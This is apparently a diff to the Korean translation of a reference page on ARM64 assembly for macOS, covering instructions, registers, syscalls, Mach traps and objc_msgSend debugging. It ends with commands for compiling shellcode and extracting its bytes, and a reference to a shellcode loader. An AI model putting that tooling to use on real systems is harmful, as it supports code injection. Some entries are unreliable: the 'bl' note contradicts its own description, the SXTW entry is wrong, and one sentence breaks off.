+- **`UBFX X1, X2, #3, #4`** X2의 bit 3부터 4 bit를 추출해 zero-extended 결과를 X1에 배치합니다.
+- **Sign Extend To X:** 값의 sign을 확장하거나(unsigned version에서는 0만 추가하여) 해당 값으로 operation을 수행할 수 있게 합니다.
+- **`SXTB X1, W2`** W2의 byte를 **W2에서 X1로** sign-extend하여 64bit를 채웁니다(`W2`는 `X2`의 절반입니다).
+- **`SXTH X1, W2`** W2의 16bit number를 **W2에서 X1로** sign-extend하여 64bit를 채웁니다.
+- **`SXTW X1, W2`** W2의 byte를 **W2에서 X1로** sign-extend하여 64bit를 채웁니다.
+- **`UXTB X1, W2`** W2의 byte에 0(unsigned)을 추가하여 **W2에서 X1로** 64bit를 채웁니다.
+- **`extr`:** 지정된 **연결된 register pair**에서 bit를 추출합니다.
+- 예: `EXTR W3, W2, W1, #3`은 **W1+W2를 concat**한 뒤 **W2의 bit 3부터 W1의 bit 3까지** 가져와 W3에 저장합니다.
+- **`cmp`**: 두 register를 **비교**하고 condition flag를 설정합니다. destination register를 zero register로 설정하는 **`subs`의 alias**입니다. `m == n`인지 확인할 때 유용합니다.
+- **`subs`**와 동일한 syntax를 지원합니다.
+- 예: `cmp x0, x1` — `x0`과 `x1`의 값을 비교하고 그에 따라 condition flag를 설정합니다.
+- **`cmn`**: **Compare negative** operand입니다. **`adds`의 alias**이며 동일한 syntax를 지원합니다. `m == -n`인지 확인할 때 유용합니다.
+- **`ccmp`**: Conditional comparison입니다. 이전 comparison이 true인 경우에만 수행되며 nzcv bit를 특정 값으로 설정합니다.
+- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> x1 != x2이고 x3 < x4이면 func으로 jump합니다.
+- 이는 **이전 `cmp`가 `NE`인 경우에만 `ccmp`가 실행**되기 때문입니다. 그렇지 않으면 `nzcv` bit가 0으로 설정되어 `blt` comparison을 만족하지 않습니다.
+- 이는 `ccmn`으로도 사용할 수 있습니다(`cmp`와 `cmn`의 관계처럼 negative를 사용하는 동일한 방식).
+- **`tst`**: comparison 값 중 어느 값이든 둘 다 1인지 확인합니다(결과를 어디에도 저장하지 않는 ANDS처럼 동작). register의 값과 비교하여 해당 값에 표시된 register bit 중 하나라도 1인지 확인할 때 유용합니다.
+- 예: `tst X1, #7`은 X1의 마지막 3 bit 중 하나가 1인지 확인합니다.
+- **`teq`**: 결과를 버리는 XOR operation
 - **`b`**: Unconditional Branch
-- Example: `b myFunction`
-- Note that this won't fill the link register with the return address (not suitable for subrutine calls that needs to return back)
-- **`bl`**: **Branch** with link, used to **call** a **subroutine**. Stores the **return address in `x30`**.
-- Example: `bl myFunction` — This calls the function `myFunction` and stores the return address in `x30`.
-- Note that this won't fill the link register with the return address (not suitable for subrutine calls that needs to return back)
-- **`blr`**: **Branch** with Link to Register, used to **call** a **subroutine** where the target is **specified** in a **register**. Stores the return address in `x30`. (This is
-- Example: `blr x1` — This calls the function whose address is contained in `x1` and stores the return address in `x30`.
-- **`ret`**: **Return** from **subroutine**, typically using the address in **`x30`**.
-- Example: `ret` — This returns from the current subroutine using the return address in `x30`.
-- **`b.<cond>`**: Conditional branches
-- **`b.eq`**: **Branch if equal**, based on the previous `cmp` instruction.
-- Example: `b.eq label` — If the previous `cmp` instruction found two equal values, this jumps to `label`.
-- **`b.ne`**: **Branch if Not Equal**. This instruction checks the condition flags (which were set by a previous comparison instruction), and if the compared values were not equal, it branches to a label or address.
-- Example: After a `cmp x0, x1` instruction, `b.ne label` — If the values in `x0` and `x1` were not equal, this jumps to `label`.
-- **`cbz`**: **Compare and Branch on Zero**. This instruction compares a register with zero, and if they are equal, it branches to a label or address.
-- Example: `cbz x0, label` — If the value in `x0` is zero, this jumps to `label`.
-- **`cbnz`**: **Compare and Branch on Non-Zero**. This instruction compares a register with zero, and if they are not equal, it branches to a label or address.
-- Example: `cbnz x0, label` — If the value in `x0` is non-zero, this jumps to `label`.
-- **`tbnz`**: Test bit and branch on nonzero
-- Example: `tbnz x0, #8, label`
-- **`tbz`**: Test bit and branch on zero
-- Example: `tbz x0, #8, label`
-- **Conditional select operations**: These are operations whose behaviour varies depending on the conditional bits.
-- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> If true, X0 = X1, if false, X0 = X2
-- `csinc Xd, Xn, Xm, cond` -> If true, Xd = Xn, if false, Xd = Xm + 1
-- `cinc Xd, Xn, cond` -> If true, Xd = Xn + 1, if false, Xd = Xn
-- `csinv Xd, Xn, Xm, cond` -> If true, Xd = Xn, if false, Xd = NOT(Xm)
-- `cinv Xd, Xn, cond` -> If true, Xd = NOT(Xn), if false, Xd = Xn
-- `csneg Xd, Xn, Xm, cond` -> If true, Xd = Xn, if false, Xd = - Xm
-- `cneg Xd, Xn, cond` -> If true, Xd = - Xn, if false, Xd = Xn
-- `cset Xd, Xn, Xm, cond` -> If true, Xd = 1, if false, Xd = 0
-- `csetm Xd, Xn, Xm, cond` -> If true, Xd = \<all 1>, if false, Xd = 0
-- **`adrp`**: Compute the **page address of a symbol** and store it in a register.
-- Example: `adrp x0, symbol` — This computes the page address of `symbol` and stores it in `x0`.
-- **`ldrsw`**: **Load** a signed **32-bit** value from memory and **sign-extend it to 64** bits. This is used for common SWITCH cases.
-- Example: `ldrsw x0, [x1]` — This loads a signed 32-bit value from the memory location pointed to by `x1`, sign-extends it to 64 bits, and stores it in `x0`.
-- **`stur`**: **Store a register value to a memory location**, using an offset from another register.
-- Example: `stur x0, [x1, #4]` — This stores the value in `x0` into the memory ddress that is 4 bytes greater than the address currently in `x1`.
-- **`svc`** : Make a **system call**. It stands for "Supervisor Call". When the processor executes this instruction, it **switches from user mode to kernel mode** and jumps to a specific location in memory where the **kernel's system call handling** code is located.
+- 예: `b myFunction`
+- 이 instruction은 link register에 return address를 채우지 않으므로 return해야 하는 subroutine call에는 적합하지 않습니다.
+- **`bl`**: link를 사용하는 **Branch**이며 **subroutine을 call**하는 데 사용됩니다. **return address를 `x30`에 저장**합니다.
+- 예: `bl myFunction` — `myFunction`을 call하고 return address를 `x30`에 저장합니다.
+- 이 instruction은 link register에 return address를 채우지 않으므로 return해야 하는 subroutine call에는 적합하지 않습니다.
+- **`blr`**: Link to Register를 사용하는 **Branch**이며 target이 **register에 지정된** **subroutine**을 call하는 데 사용됩니다. return address를 `x30`에 저장합니다. (This is
+- 예: `blr x1` — `x1`에 포함된 address의 function을 call하고 return address를 `x30`에 저장합니다.
+- **`ret`**: 일반적으로 **`x30`**의 address를 사용하여 **subroutine에서 Return**합니다.
+- 예: `ret` — `x30`의 return address를 사용하여 현재 subroutine에서 return합니다.
+- **`b.<cond>`**: Conditional branch
+- **`b.eq`**: 이전 `cmp` instruction을 기준으로 **같으면 Branch**합니다.
+- 예: `b.eq label` — 이전 `cmp` instruction에서 두 값이 같다고 판단되면 `label`로 jump합니다.
+- **`b.ne`**: **같지 않으면 Branch**합니다. 이 instruction은 이전 comparison instruction이 설정한 condition flag를 확인하고, 비교한 값이 다르면 label 또는 address로 branch합니다.
+- 예: `cmp x0, x1` instruction 후 `b.ne label` — `x0`과 `x1`의 값이 다르면 `label`로 jump합니다.
+- **`cbz`**: **Compare and Branch on Zero**입니다. register를 0과 비교하고 같으면 label 또는 address로 branch합니다.
+- 예: `cbz x0, label` — `x0`의 값이 0이면 `label`로 jump합니다.
+- **`cbnz`**: **Compare and Branch on Non-Zero**입니다. register를 0과 비교하고 다르면 label 또는 address로 branch합니다.
+- 예: `cbnz x0, label` — `x0`의 값이 0이 아니면 `label`로 jump합니다.
+- **`tbnz`**: bit를 test하고 nonzero이면 branch합니다.
+- 예: `tbnz x0, #8, label`
+- **`tbz`**: bit를 test하고 zero이면 branch합니다.
+- 예: `tbz x0, #8, label`
+- **Conditional select operation**: conditional bit에 따라 동작이 달라지는 operation입니다.
+- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> true이면 X0 = X1, false이면 X0 = X2
+- `csinc Xd, Xn, Xm, cond` -> true이면 Xd = Xn, false이면 Xd = Xm + 1
+- `cinc Xd, Xn, cond` -> true이면 Xd = Xn + 1, false이면 Xd = Xn
+- `csinv Xd, Xn, Xm, cond` -> true이면 Xd = Xn, false이면 Xd = NOT(Xm)
+- `cinv Xd, Xn, cond` -> true이면 Xd = NOT(Xn), false이면 Xd = Xn
+- `csneg Xd, Xn, Xm, cond` -> true이면 Xd = Xn, false이면 Xd = - Xm
+- `cneg Xd, Xn, cond` -> true이면 Xd = - Xn, false이면 Xd = Xn
+- `cset Xd, Xn, Xm, cond` -> true이면 Xd = 1, false이면 Xd = 0
+- `csetm Xd, Xn, Xm, cond` -> true이면 Xd = \<all 1>, false이면 Xd = 0
+- **`adrp`**: **symbol의 page address**를 계산하여 register에 저장합니다.
+- 예: `adrp x0, symbol` — `symbol`의 page address를 계산하여 `x0`에 저장합니다.
+- **`ldrsw`**: memory에서 signed **32비트** 값을 **load**하고 **64비트로 sign-extend**합니다. 일반적인 SWITCH case에 사용됩니다.
+- 예: `ldrsw x0, [x1]` — `x1`이 가리키는 memory location에서 signed 32-bit 값을 load하고, 64bit로 sign-extend하여 `x0`에 저장합니다.
+- **`stur`**: 다른 register의 offset을 사용하여 **register 값을 memory location에 store**합니다.
+- 예: `stur x0, [x1, #4]` — `x0`의 값을 현재 `x1`의 address보다 4바이트 큰 memory address에 store합니다.
+- **`svc`** : **system call**을 수행합니다. "Supervisor Call"의 약어입니다. processor가 이 instruction을 실행하면 **user mode에서 kernel mode로 전환**하고, **kernel의 system call handling** code가 있는 memory의 특정 location으로 jump합니다.
 
-- Example:
+- 예:
 
 ```armasm
 mov x8, 93  ; Load the system call number for exit (93) into register x8.
@@ -235,36 +235,36 @@ svc 0       ; Make the system call.
 
 ### **Function Prologue**
 
-1. **Save the link register and frame pointer to the stack**:
+1. **link register와 frame pointer를 stack에 저장**:
 ```armasm
 stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
 ```
-2. **새 프레임 포인터 설정**: `mov x29, sp` (현재 함수의 새 프레임 포인터를 설정합니다)
-3. **로컬 변수용 스택 공간 할당** (필요한 경우): `sub sp, sp, <size>` (`<size>`는 필요한 바이트 수입니다)
+2. **새 frame pointer 설정**: `mov x29, sp` (현재 function의 새 frame pointer를 설정)
+3. **local variable을 위한 stack 공간 할당** (필요한 경우): `sub sp, sp, <size>` (`<size>`는 필요한 byte 수)
 
-### **함수 에필로그**
+### **Function Epilogue**
 
-1. **로컬 변수 할당 해제** (할당된 경우): `add sp, sp, <size>`
-2. **링크 레지스터 및 프레임 포인터 복원**:
+1. **local variable 할당 해제** (할당된 경우): `add sp, sp, <size>`
+2. **link register와 frame pointer 복원**:
 ```armasm
 ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
 ```
-3. **Return**: `ret` (링크 레지스터에 있는 주소를 사용하여 호출자에게 제어를 반환함)
+3. **Return**: `ret` (link register의 주소를 사용하여 caller에게 제어를 반환)
 
-## ARM 일반 메모리 보호
+## ARM Common Memory Protections
 
 {{#ref}}
 ../../../binary-exploitation/ios-exploiting/README.md
 {{#endref}}
 
-## AARCH32 실행 상태
+## AARCH32 Execution State
 
-Armv8-A는 32비트 프로그램 실행을 지원합니다. **AArch32**는 **두 가지 명령어 세트** 중 하나인 **`A32`** 또는 **`T32`**로 실행될 수 있으며 **`interworking`**을 통해 전환할 수 있습니다.\
-권한이 있는 64비트 프로그램은 예외 레벨 전송을 실행하여 더 낮은 권한의 32비트 프로그램의 실행을 예약할 수 있습니다.\
-64비트에서 32비트로의 전환은 더 낮은 예외 레벨에서 발생한다는 점에 유의하세요(예: EL1의 64비트 프로그램이 EL0의 프로그램을 트리거하는 경우). 이는 `AArch32` 프로세스 스레드가 실행 준비가 되었을 때 특수 레지스터인 **`SPSR_ELx`**의 **비트 4를** **1로 설정**하고 `SPSR_ELx`의 나머지 부분에 **AArch32** 프로그램의 CPSR을 저장함으로써 이루어집니다. 그런 다음 권한 있는 프로세스가 **`ERET`** 명령을 호출하여 프로세서가 **`AArch32`**로 전환되며 CPSR에 따라 A32 또는 T32로 진입합니다.**
+Armv8-A는 32-bit 프로그램의 실행을 지원합니다. **AArch32**는 **`A32`** 및 **`T32`**라는 **두 가지 instruction set** 중 하나로 실행될 수 있으며, **`interworking`**을 통해 두 instruction set 간에 전환할 수 있습니다.\
+**Privileged** 64-bit 프로그램은 exception level transfer를 실행하여 더 낮은 권한의 32-bit exception level로 전환함으로써 **32-bit 프로그램의 실행**을 예약할 수 있습니다.\
+64-bit에서 32-bit로의 전환은 exception level이 낮아질 때 발생합니다(예: EL1의 64-bit 프로그램이 EL0의 프로그램을 실행하는 경우). 이는 **`AArch32`** process thread가 실행될 준비가 되었을 때 특수 레지스터 **`SPSR_ELx`**의 **bit 4를** **1로** 설정하고, `SPSR_ELx`의 나머지 부분에 **`AArch32`** 프로그램의 CPSR을 저장하여 수행됩니다. 그런 다음 privileged process가 **`ERET`** instruction을 호출하면 processor가 **CPSR에 따라** A32 또는 T32로 진입하면서 **`AArch32`**로 전환됩니다.**
 
-`interworking`은 CPSR의 J 및 T 비트를 사용하여 발생합니다. `J=0` 및 `T=0`은 **`A32`**를 의미하고 `J=0` 및 `T=1`은 **T32**를 의미합니다. 이는 기본적으로 명령어 세트가 T32임을 표시하기 위해 **최하위 비트를 1로 설정**하는 것을 의미합니다.\
-이 비트는 **interworking 분기 명령들**에서 설정되지만, PC가 목적지 레지스터로 설정될 때 다른 명령들로 직접 설정될 수도 있습니다. 예:
+**`interworking`**은 CPSR의 J bit와 T bit를 사용하여 발생합니다. `J=0` 및 `T=0`은 **`A32`**를 의미하고, `J=0` 및 `T=1`은 **T32**를 의미합니다. 이는 기본적으로 instruction set이 T32임을 나타내기 위해 **최하위 bit를 1로 설정**하는 것으로 해석됩니다.\
+이는 **interworking branch instructions** 중에 설정되지만, PC가 destination register로 설정될 때 다른 instruction을 사용하여 직접 설정할 수도 있습니다. 예:
 
 또 다른 예:
 ```armasm
@@ -277,62 +277,62 @@ bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)
 mov r0, #0
 mov r0, #8
 ```
-### 레지스터
+### Registers
 
-16개의 32-bit 레지스터(r0-r15)가 있다. **r0에서 r14까지**는 **임의의 연산**에 사용할 수 있지만, 일부는 일반적으로 예약되어 있다:
+16개의 32-bit register(`r0-r15`)가 있습니다. **`r0`부터 `r14`까지**는 **어떤 operation에도** 사용할 수 있지만, 일부는 일반적으로 다음과 같이 예약됩니다.
 
-- **`r15`**: 프로그램 카운터(항상). 다음 명령어의 주소를 담는다. A32에서는 current + 8, T32에서는 current + 4.
-- **`r11`**: 프레임 포인터
-- **`r12`**: 절차 내부 호출 레지스터
-- **`r13`**: 스택 포인터 (스택은 항상 16바이트 정렬되어 있음)
-- **`r14`**: 링크 레지스터
+- **`r15`**: Program counter (항상). 다음 instruction의 address를 포함합니다. A32에서는 current + 8, T32에서는 current + 4입니다.
+- **`r11`**: Frame Pointer
+- **`r12`**: Intra-procedural call register
+- **`r13`**: Stack Pointer (stack은 항상 16-byte aligned 상태여야 합니다)
+- **`r14`**: Link Register
 
-또한 레지스터는 **`banked registries`**에 백업된다. 이는 레지스터 값을 저장하여 예외 처리와 특권 연산에서 매번 수동으로 저장/복원할 필요 없이 **빠른 컨텍스트 스위칭**을 가능하게 하는 장소이다.\
-이것은 예외가 전달된 프로세서 모드의 **`CPSR`**에서 **`SPSR`**로 프로세서 상태를 저장함으로써 이루어진다. 예외 복귀 시에는 **`CPSR`**이 **`SPSR`**에서 복원된다.
+또한 register는 **`banked registries`**에 백업됩니다. 이는 register 값을 저장하는 장소로, exception handling 및 privileged operation에서 **fast context switching**을 수행할 수 있도록 하여 매번 register를 수동으로 저장하고 복원할 필요를 없앱니다.\
+이는 processor mode에서 exception이 발생한 뒤 해당 exception이 처리될 mode의 **`SPSR`**에 **`CPSR`의 processor state를 저장**하는 방식으로 수행됩니다. exception에서 return할 때는 **`SPSR`에서 `CPSR`이 복원**됩니다.
 
 ### CPSR - Current Program Status Register
 
-AArch32에서 CPSR은 AArch64의 **`PSTATE`**와 유사하게 동작하며, 예외가 발생하면 실행을 나중에 복원하기 위해 **`SPSR_ELx`**에 저장된다:
+AArch32에서 CPSR은 AArch64의 **`PSTATE`**와 유사하게 동작하며, 나중에 execution을 복원하기 위해 exception이 발생했을 때 **`SPSR_ELx`**에도 저장됩니다.
 
 <figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>
 
-필드는 몇 개의 그룹으로 나뉜다:
+field는 몇 가지 group으로 나뉩니다.
 
-- Application Program Status Register (APSR): 산술 플래그이며 EL0에서 접근 가능
-- Execution State Registers: 프로세스 동작(운영체제가 관리)
+- Application Program Status Register (APSR): Arithmetic flag이며 EL0에서 접근할 수 있습니다.
+- Execution State Registers: Process behaviour를 관리합니다(OS가 관리).
 
 #### Application Program Status Register (APSR)
 
-- **`N`**, **`Z`**, **`C`**, **`V`** 플래그(AArch64와 동일)
-- **`Q`** 플래그: 전문 포화 산술 명령 실행 중에 **정수 포화(integer saturation)**가 발생하면 1로 설정된다. 한 번 **`1`**로 설정되면 수동으로 0으로 설정할 때까지 유지된다. 또한 이 값을 암묵적으로 검사하는 명령은 없으며 수동으로 읽어야 한다.
-- **`GE`** (Greater than or equal) 플래그: SIMD (Single Instruction, Multiple Data) 연산에서 사용된다(예: "parallel add", "parallel subtract"). 이러한 연산은 단일 명령으로 여러 데이터 포인트를 처리할 수 있다.
+- **`N`**, **`Z`**, **`C`**, **`V`** flag(AArch64와 동일)
+- **`Q`** flag: specialized saturating arithmetic instruction의 execution 중 **integer saturation이 발생**하면 1로 설정됩니다. 한 번 **`1`**로 설정되면 수동으로 0으로 설정할 때까지 해당 값을 유지합니다. 또한 값을 암시적으로 확인하는 instruction은 없으므로 직접 읽어서 확인해야 합니다.
+- **`GE`**(Greater than or equal) flag: "parallel add" 및 "parallel subtract"와 같은 SIMD(Single Instruction, Multiple Data) operation에서 사용됩니다. 이러한 operation을 사용하면 하나의 instruction으로 여러 data point를 처리할 수 있습니다.
 
-예를 들어, **`UADD8`** 명령은 병렬로 네 쌍의 바이트(두 개의 32비트 오퍼랜드에서)를 더하여 결과를 32비트 레지스터에 저장한다. 그런 다음 이 결과에 따라 **`APSR`**의 **`GE`** 플래그를 설정한다. 각 GE 플래그는 바이트 더하기 중 하나에 대응하며, 해당 바이트 쌍의 덧셈이 오버플로우했는지를 나타낸다.
+예를 들어 **`UADD8`** instruction은 두 개의 32-bit operand에서 **네 쌍의 byte를 병렬로 더하고**, 결과를 32-bit register에 저장합니다. 그런 다음 결과에 따라 **APSR의 `GE` flag를 설정**합니다. 각 GE flag는 하나의 byte addition에 대응하며, 해당 byte pair의 addition에서 **overflow가 발생했는지**를 나타냅니다.
 
-**`SEL`** 명령은 이러한 **`GE`** 플래그를 사용하여 조건부 동작을 수행한다.
+**`SEL`** instruction은 이러한 GE flag를 사용하여 conditional action을 수행합니다.
 
 #### Execution State Registers
 
-- **`J`** 및 **`T`** 비트: **`J`**는 0이어야 하며 **`T`**가 0이면 A32 명령 세트가 사용되고, 1이면 T32가 사용된다.
-- **IT Block State Register** (`ITSTATE`): 이는 10-15 비트와 25-26 비트이다. **`IT`** 접두사 그룹 내부의 명령들에 대한 조건을 저장한다.
-- **`E`** 비트: 엔디안성(endianness)을 나타낸다.
-- **Mode and Exception Mask Bits** (0-4): 현재 실행 상태를 결정한다. 5번째 비트는 프로그램이 32bit(1)로 실행되는지 또는 64bit(0)로 실행되는지를 나타낸다. 나머지 4비트는 예외가 발생하여 처리되는 동안 사용되는 **예외 모드**를 나타내며, 설정된 값은 처리 중 다른 예외가 발생했을 때의 우선순위를 표시한다.
+- **`J`** 및 **`T`** bit: **`J`**는 0이어야 하며, **`T`**가 0이면 A32 instruction set이 사용되고 1이면 T32가 사용됩니다.
+- **IT Block State Register**(`ITSTATE`): 10-15 및 25-26번 bit입니다. **`IT`**가 prefix로 붙은 group 내부 instruction의 condition을 저장합니다.
+- **`E`** bit: **endianness**를 나타냅니다.
+- **Mode 및 Exception Mask Bits**(0-4): 현재 execution state를 결정합니다. 다섯 번째 bit는 program이 32-bit(1)로 실행되는지 64-bit(0)로 실행되는지를 나타냅니다. 나머지 4개는 현재 사용 중인 **exception mode**를 나타냅니다(exception이 발생하여 처리 중인 경우). 설정된 number는 해당 exception을 처리하는 동안 다른 exception이 trigger될 때의 현재 priority를 나타냅니다.
 
 <figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>
 
-- **`AIF`**: 특정 예외는 **`A`**, `I`, `F` 비트를 사용하여 비활성화할 수 있다. **`A`**가 1이면 **asynchronous aborts**가 발생함을 의미한다. **`I`**는 외부 하드웨어 **Interrupts Requests**(IRQs)에 응답하도록 설정하고, `F`는 **Fast Interrupt Requests**(FIRs)에 관련된다.
+- **`AIF`**: 특정 exception은 **`A`**, `I`, `F` bit를 사용하여 disable할 수 있습니다. **`A`**가 1이면 **asynchronous abort**가 trigger된다는 의미입니다. **`I`**는 외부 hardware **Interrupt Request**(IRQ)에 응답하도록 설정합니다. `F`는 **Fast Interrupt Request**(FIR)와 관련이 있습니다.
 
 ## macOS
 
 ### BSD syscalls
 
-Check out [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) or run `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h`. BSD syscalls will have **x16 > 0**.
+[**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)를 확인하거나 `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h`를 실행합니다. BSD syscall은 **x16 > 0**입니다.
 
 ### Mach Traps
 
-Check out in [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) the `mach_trap_table` and in [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) the prototypes. The mex number of Mach traps is `MACH_TRAP_TABLE_COUNT` = 128. Mach traps will have **x16 < 0**, so you need to call the numbers from the previous list with a **minus**: **`_kernelrpc_mach_vm_allocate_trap`** is **`-10`**.
+[**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html)에서 `mach_trap_table`을, [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h)에서 prototype을 확인합니다. Mach trap의 최대 number는 `MACH_TRAP_TABLE_COUNT` = 128입니다. Mach trap은 **`x16 < 0`**이므로, 이전 목록의 number를 **minus**와 함께 호출해야 합니다. **`_kernelrpc_mach_vm_allocate_trap`**은 **`-10`**입니다.
 
-You can also check **`libsystem_kernel.dylib`** in a disassembler to find how to call these (and BSD) syscalls:
+disassembler에서 **`libsystem_kernel.dylib`**을 확인하여 이러한 syscall(BSD syscall 포함)을 호출하는 방법을 확인할 수도 있습니다.
 ```bash
 # macOS
 dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e
@@ -340,32 +340,32 @@ dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Lib
 # iOS
 dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
 ```
-Note that **Ida** and **Ghidra** can also decompile **specific dylibs** from the cache just by passing the cache.
+**Ida**와 **Ghidra**는 cache를 전달하기만 해도 cache에서 **specific dylibs**를 decompile할 수 있다는 점에 유의하세요.
 
 > [!TIP]
-> 때로는 여러 syscalls (BSD 및 Mach)의 코드가 스크립트로 생성되기 때문에(소스 코드의 주석을 확인) **`libsystem_kernel.dylib`**에서 **디컴파일된** 코드를 확인하는 것이 **소스 코드**를 확인하는 것보다 더 쉬울 때가 있습니다. dylib에서는 실제로 무엇이 호출되는지를 찾을 수 있습니다.
+> 때로는 **source code**를 확인하는 것보다 **`libsystem_kernel.dylib`**의 **decompiled** code를 확인하는 편이 더 쉽습니다. 여러 syscall(BSD 및 Mach)의 code가 scripts를 통해 생성되기 때문입니다(source code의 comments 확인). 반면 dylib에서는 실제로 무엇이 호출되는지 확인할 수 있습니다.
 
 ### machdep calls
 
-XNU는 machine dependent(머신 종속)이라고 불리는 또 다른 유형의 호출을 지원합니다. 이러한 호출들의 번호는 아키텍처에 따라 달라지며, 호출명이나 번호가 고정되어 있지 않습니다.
+XNU는 machine dependent라고 하는 또 다른 유형의 calls를 지원합니다. 이러한 calls의 number는 architecture에 따라 달라지며, calls와 number 모두 계속 일정하게 유지된다는 보장이 없습니다.
 
 ### comm page
 
-이것은 커널 소유의 메모리 페이지로, 모든 사용자 프로세스의 주소 공간에 매핑됩니다. 자주 사용되어 syscalls를 통해 전환하는 것이 매우 비효율적일 정도인 커널 서비스의 경우, 사용자 모드에서 커널 공간으로의 전환을 syscalls를 사용하는 것보다 더 빠르게 하기 위해 설계되었습니다.
+이는 모든 user process의 address space에 매핑되는 kernel 소유의 memory page입니다. transition이 매우 비효율적일 정도로 자주 사용되는 kernel service에 대해 syscall을 사용하는 것보다 user mode에서 kernel space로의 transition을 더 빠르게 수행하기 위한 것입니다.
 
-예를 들어 `gettimeofdate` 호출은 comm page에서 `timeval` 값을 직접 읽습니다.
+예를 들어 `gettimeofdate` call은 comm page에서 `timeval` 값을 직접 읽습니다.
 
 ### objc_msgSend
 
-Objective-C 또는 Swift 프로그램에서 이 함수가 사용되는 것을 매우 흔히 볼 수 있습니다. 이 함수는 Objective-C 객체의 메서드를 호출할 수 있게 해줍니다.
+Objective-C 또는 Swift program에서 이 function이 사용되는 경우는 매우 흔합니다. 이 function을 사용하면 Objective-C object의 method를 호출할 수 있습니다.
 
 Parameters ([more info in the docs](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):
 
-- x0: self -> 인스턴스를 가리키는 포인터
-- x1: op -> 메서드의 Selector
-- x2... -> 호출된 메서드의 나머지 인수들
+- x0: self -> instance에 대한 Pointer
+- x1: op -> method의 Selector
+- x2... -> invoked method의 나머지 arguments
 
-따라서, 이 함수로 분기하기 전에 breakpoint를 걸어두면 lldb에서 무엇이 호출되는지 쉽게 찾을 수 있습니다(이 예제에서는 객체가 명령을 실행할 `NSConcreteTask`의 객체를 호출합니다):
+따라서 이 function으로 branch하기 전에 breakpoint를 설정하면, 다음과 같이 lldb에서 무엇이 invoked되는지 쉽게 확인할 수 있습니다(이 예제에서 object는 command를 실행할 `NSConcreteTask`의 object를 호출합니다):
 ```bash
 # Right in the line were objc_msgSend will be called
 (lldb) po $x0
@@ -384,31 +384,31 @@ whoami
 )
 ```
 > [!TIP]
-> 환경 변수 **`NSObjCMessageLoggingEnabled=1`** 를 설정하면 이 함수가 호출될 때 `/tmp/msgSends-pid` 같은 파일에 기록할 수 있습니다.
+> env variable **`NSObjCMessageLoggingEnabled=1`**을 설정하면 `/tmp/msgSends-pid`와 같은 파일에 이 함수가 호출되는 시점을 log할 수 있습니다.
 >
-> 또한, **`OBJC_HELP=1`** 를 설정하고 어떤 바이너리를 실행하면 특정 Objc-C 동작이 발생할 때 **로그**를 남기기 위해 사용할 수 있는 다른 환경 변수들을 확인할 수 있습니다.
+> 또한 **`OBJC_HELP=1`**을 설정하고 임의의 binary를 호출하면 특정 Objc-C 동작이 발생할 때 **log**하는 데 사용할 수 있는 다른 environment variable도 확인할 수 있습니다.
 
-이 함수가 호출되면, 지정된 인스턴스에서 호출된 메서드를 찾아야 하며, 이를 위해 다음과 같은 여러 검색이 수행됩니다:
+이 함수가 호출되면 지정된 instance에서 호출된 method를 찾아야 하며, 이를 위해 다음과 같은 검색이 수행됩니다.
 
 - Perform optimistic cache lookup:
-- If successful, done
+- 성공하면 종료
 - Acquire runtimeLock (read)
-- If (realize && !cls->realized) 클래스 실체화(realize)
-- If (initialize && !cls->initialized) 클래스 초기화(initialize)
+- If (realize && !cls->realized) realize class
+- If (initialize && !cls->initialized) initialize class
 - Try class own cache:
-- If successful, done
+- 성공하면 종료
 - Try class method list:
-- If found, fill cache and done
+- 찾으면 cache를 채우고 종료
 - Try superclass cache:
-- If successful, done
+- 성공하면 종료
 - Try superclass method list:
-- If found, fill cache and done
+- 찾으면 cache를 채우고 종료
 - If (resolver) try method resolver, and repeat from class lookup
-- If still here (= all else has failed) try forwarder
+- 여전히 여기까지 왔다면 (= 다른 모든 방법이 실패했다면) forwarder 시도
 
 ### Shellcodes
 
-컴파일하려면:
+compile하려면:
 ```bash
 as -o shell.o shell.s
 ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
@@ -423,7 +423,7 @@ for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ;
 echo -n '\\x'$c
 done
 ```
-새로운 macOS의 경우:
+최신 macOS의 경우:
 ```bash
 # Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
 for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
@@ -432,7 +432,7 @@ done
 ```
 <details>
 
-<summary>shellcode를 테스트하는 C 코드</summary>
+<summary>shellcode를 테스트하기 위한 C 코드</summary>
 ```c
 // code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
 // gcc loader.c -o loader
@@ -482,7 +482,7 @@ return 0;
 
 #### Shell
 
